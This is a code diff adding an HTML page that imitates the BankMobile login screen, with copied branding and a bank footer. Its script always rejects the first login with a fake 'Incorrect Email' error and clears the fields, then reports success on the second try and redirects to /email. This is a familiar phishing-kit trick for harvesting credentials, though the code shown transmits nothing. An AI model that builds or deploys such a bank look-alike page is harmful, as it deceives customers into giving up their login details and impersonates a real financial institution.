@@ -1,0 +1,286 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>BankMobile — Login</title>
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@700;900&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg-start:#f7fdff;
+      --bg-end:#f1eefe;
+      --card-bg:#fff;
+      --muted:#6b7280;
+      --accent:#0070ff;
+      --input-border:#c9ced3;
+      --shadow: 0 6px 18px rgba(17,24,39,0.08);
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:"Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: linear-gradient(135deg, rgba(225,245,255,0.9) 0%, rgba(243,240,250,0.95) 100%);
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      color:#111827;
+    }
+
+    .hero{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      flex:1 0 auto;
+      padding:48px 20px;
+    }
+
+    .wrap{
+      width:100%;
+      max-width:720px;
+      display:grid;
+      gap:28px;
+      justify-items:center;
+    }
+
+    .heading{ width:100%; max-width:420px; text-align:left; }
+    @media (max-width:900px){ .heading{text-align:center} }
+
+    .kicker{
+      font-family:"Merriweather", Georgia, serif;
+      font-weight:700;
+      font-size:28px;
+      margin:0 0 8px;
+    }
+    .headline{
+      font-family:"Merriweather", Georgia, serif;
+      font-weight:900;
+      font-size:34px;
+      margin:0;
+    }
+
+    .card{
+      background:var(--card-bg);
+      border-radius:8px;
+      box-shadow:var(--shadow);
+      padding:22px;
+      width:100%;
+      max-width:420px;
+      border:1px solid rgba(16,24,40,0.03);
+    }
+
+    .field{ display:flex; flex-direction:column; gap:10px; margin-bottom:14px; }
+    .input-wrap{ position:relative; }
+
+    input[type="text"], input[type="password"]{
+      width:100%;
+      padding:14px 44px 14px 14px;
+      font-size:15px;
+      border-radius:6px;
+      border:1px solid var(--input-border);
+      background:transparent;
+      font-family:inherit;
+    }
+    input::placeholder{ color:#9aa0a6 }
+    input:focus{ border-color: rgba(0,112,255,0.7); outline:none; box-shadow:0 4px 10px rgba(2,6,23,0.04); }
+
+    .toggle-btn{
+      position:absolute;
+      right:8px;
+      top:50%;
+      transform:translateY(-50%);
+      height:32px;
+      width:32px;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      border:none;
+      background:transparent;
+      cursor:pointer;
+    }
+
+    .forgot{ display:block; margin-top:6px; font-size:13px; color:var(--accent); text-decoration:underline; }
+
+    .error-box{
+      display:none;
+      margin-top:8px;
+      font-size:14px;
+      line-height:1.4;
+      color:#dc2626;
+      align-items:flex-start;
+      gap:8px;
+    }
+
+    .cta-wrap{ margin-top:22px; width:100%; display:flex; justify-content:center; }
+
+    .login-btn{
+      width:100%;
+      max-width:420px;
+      padding:18px;
+      border-radius:6px;
+      border:none;
+      font-weight:600;
+      font-size:16px;
+      cursor:pointer;
+      background: linear-gradient(180deg, rgba(2,132,255,0.12), rgba(2,132,255,0.08));
+      color:#c7d4e8;
+    }
+    .login-btn[disabled]{ opacity:0.55; cursor:not-allowed; }
+
+    footer{ padding:18px 20px; text-align:center; font-size:12px; color:#6b7280; }
+
+    @media (max-width:480px){
+      .kicker{ font-size:20px }
+      .headline{ font-size:24px }
+      .card{ padding:16px }
+      .login-btn{ padding:14px }
+    }
+
+    .sr-only{ position:absolute; width:1px; height:1px; padding:0; margin:-1px; overflow:hidden; clip:rect(0,0,0,0); white-space:nowrap; border:0; }
+  </style>
+</head>
+<body>
+  <main class="hero" role="main">
+    <div class="wrap" aria-labelledby="login-heading">
+
+      <div class="heading">
+        <p class="kicker">Log in to your</p>
+        <h1 id="login-heading" class="headline">BankMobile Account</h1>
+      </div>
+
+      <section class="card" aria-labelledby="login-heading">
+        <form id="loginForm" novalidate>
+          <div class="field">
+            <label for="username" class="sr-only">Username</label>
+            <div class="input-wrap">
+              <input id="username" name="username" type="text" placeholder="Email" autocomplete="username" required />
+            </div>
+          </div>
+
+          <div class="field">
+            <label for="password" class="sr-only">Password</label>
+            <div class="input-wrap">
+              <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required />
+              <button type="button" class="toggle-btn" id="togglePassword" aria-label="Show password" title="Show password">
+                <svg id="eyeIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z" stroke="#111827" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+                  <circle cx="12" cy="12" r="3" stroke="#111827" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </button>
+            </div>
+
+            <!-- Inline error -->
+            <div id="errorMsg" class="error-box" role="alert" aria-live="polite">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="#dc2626" stroke-width="1.5" aria-hidden="true">
+                <circle cx="12" cy="12" r="10" fill="none"/>
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4m0 4h.01"/>
+              </svg>
+              <span>Error: Incorrect Email. The email you have entered does not match our records. Please try again or select forgot login information.</span>
+            </div>
+
+            <!-- Forgot link (not functional) -->
+           <!--  <a href="/email" class="forgot" id="forgotLink">Forgot login information?</a> -->
+          </div>
+
+          <div class="cta-wrap">
+            <button id="loginBtn" class="login-btn" type="submit" disabled>Login</button>
+          </div>
+        </form>
+      </section>
+
+    </div>
+  </main>
+
+  <footer>
+    © 2025 BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved. Powered by BM Technologies, Inc. BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC.
+  </footer>
+
+  
+ <script>
+  const form = document.getElementById('loginForm');
+  const username = document.getElementById('username');
+  const password = document.getElementById('password');
+  const loginBtn = document.getElementById('loginBtn');
+  const toggleBtn = document.getElementById('togglePassword');
+  const eyeIcon = document.getElementById('eyeIcon');
+  const errorMsg = document.getElementById('errorMsg');
+  const errorMsgText = errorMsg.querySelector("span");
+
+  let firstAttempt = true; // track attempts
+
+  function updateButtonState(){
+    const ok = username.value.trim().length > 0 && password.value.trim().length > 0;
+    loginBtn.disabled = !ok;
+    if (ok) {
+      loginBtn.style.color = '#053569';
+      loginBtn.style.background = 'linear-gradient(180deg, rgba(0,112,255,0.16), rgba(0,112,255,0.08))';
+    } else {
+      loginBtn.style.color = '#c7d4e8';
+      loginBtn.style.background = 'linear-gradient(180deg, rgba(2,132,255,0.12), rgba(2,132,255,0.08))';
+    }
+  }
+
+  username.addEventListener('input', updateButtonState);
+  password.addEventListener('input', updateButtonState);
+
+  toggleBtn.addEventListener('click', () => {
+    const isPwd = password.type === 'password';
+    password.type = isPwd ? 'text' : 'password';
+    toggleBtn.setAttribute('aria-label', isPwd ? 'Hide password' : 'Show password');
+    toggleBtn.title = isPwd ? 'Hide password' : 'Show password';
+
+    if (isPwd) {
+      eyeIcon.innerHTML = `
+        <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z" stroke="#111827" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        <circle cx="12" cy="12" r="3" stroke="#111827" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" fill="#111827"/>
+      `;
+    } else {
+      eyeIcon.innerHTML = `
+        <path d="M1 1l22 22" stroke="#111827" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+        <path d="M17.94 17.94A10.97 10.97 0 0 1 12 19c-6 0-10-7-10-7a21.31 21.31 0 0 1 4.11-5.06" stroke="#111827" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+      `;
+    }
+  });
+
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+    if (loginBtn.disabled) return;
+
+    errorMsg.style.display = 'none';
+    loginBtn.textContent = 'Logging in...';
+    loginBtn.disabled = true;
+
+    setTimeout(() => {
+      if (firstAttempt) {
+        // First attempt: show error + clear inputs
+        errorMsg.style.display = 'flex';
+        username.value = "";
+        password.value = "";
+        loginBtn.textContent = 'Login';
+        updateButtonState();
+        errorMsg.scrollIntoView({behavior:'smooth', block:'center'});
+        firstAttempt = false;
+      } else {
+        // Second attempt: success → redirect
+        loginBtn.textContent = 'Login successful!';
+        loginBtn.style.background = 'green';
+        loginBtn.style.color = '#fff';
+        setTimeout(() => {
+          // Instead of just "new.html"
+window.location.href = "/email";
+;
+        }, 1200); // small delay before redirect
+      }
+    }, 1000);
+  });
+
+  updateButtonState();
+</script>
+
+
+</body>
+</html>
